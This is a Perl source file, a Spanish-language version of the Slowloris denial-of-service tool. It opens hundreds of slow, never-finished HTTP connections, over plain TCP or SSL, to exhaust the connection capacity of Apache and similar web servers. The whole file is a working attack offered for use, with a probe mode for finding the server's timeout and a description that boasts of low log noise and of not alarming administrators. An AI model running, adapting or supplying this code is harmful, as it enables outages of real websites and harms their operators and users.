#!/usr/bin/perl -w
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;

$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors

print <<EOTEXT;
Bienvenido a Slowloris
EOTEXT

my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'dns=s'     => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

if ($version) {
    print "Version 1.0\n";
    exit;
}

unless ($host) {
    print "Uso:\n\n\tperl $0 -dns [www.ejemplo.com] -parametros\n";
    print "\n\tEscriba 'perldoc $0' para ayuda con opciones.\n\n";
    exit;
}

unless ($port) {
    $port = 80;
    print "Estableciendo puerto por defecto 80.\n";
}

unless ($tcpto) {
    $tcpto = 5;
    print "Estableciendo 5 segundos como tiempo de espera para conecciones tcp .\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 100;
        print "Estableciendo 100 segundos para reconeccion.\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Estableciendo 1000 conecciones.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Multihilo encendido.\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No se encontro la capacidad multihilo!\n";
    print "Slowloris se pondria mas lento de lo normal.\n";
}

my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "Este test podria llevar aproximadamente $totaltime minutos.\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "Conexion exitosa, ahora vamos a esperar...\n";
        }
        else {
            print
"Eso no estubo tan bien, me pude conectar pero no pude enviar datos a $host:$port.\n";
            print "Algo esta mal?\nDying.\n";
            exit;
        }
    }
    else {
        print "Uhm... 	No pude conectarme a $host:$port.\n";
        print "Algo esta mal?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Intentando un retraso de $times[$i]: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tHa funcionado.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tHa fallado despues de $times[$i] segundos.\n";
        }
    }

    if ( print $sock "Conexion: cerrada\r\n\r\n" ) {
        print "Okay ha sido suficiente tiempo. Slowloris ha cerrada un el socket.\n";
        print "Use $delay segundos para -timeout.\n";
        exit;
    }
    else {
        print "Socket cerrado por conexion del servidor remoto.\n";
        print "Use $delay segundos para -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
El tiempo de espera a sido demasiado corto ($delay segundos) y esto generalmente 
toma entre 200-500 hilos para la mayoria de los servidores y asumiendo toda su latencia... 
Podrias tener problemas usando Slowloris contra este objetivo. Tu puedes ajustar el -timeout en menos de 10 segundos pero no podria dar el tiempo sufiente para que el socket se construya.
EOSUCKS2BU
    }
}
else {
    print
"Conectando a $host:$port cada $timeout segundos con $connections sockets:\n";

    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        print "\t\tBuilding sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print "\t\tEnviando datos.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print
"Estadisticas actuales:\tSlowloris ahora ha enviado $packetcount paquetes exitosamente.\nEste hilo ahora esta reposando $timeout segundos...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}

__END__

=head1 TITLE

Slowloris by llaera

=head1 VERSION

Version 1.0 Stable

=head1 DATE

02/11/2013

=head1 AUTHOR

Laera Loris llaera@outlook.com

=head1 ABSTRACT

Slowloris both helps identify the timeout windows of a HTTP server or Proxy server, can bypass httpready protection and ultimately performs a fairly low bandwidth denial of service.  It has the added benefit of allowing the server to come back at any time (once the program is killed), and not spamming the logs excessively.  It also keeps the load nice and low on the target server, so other vital processes don't die unexpectedly, or cause alarm to anyone who is logged into the server for other reasons.

=head1 AFFECTS

Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, others...?

=head1 NOT AFFECTED

IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...?
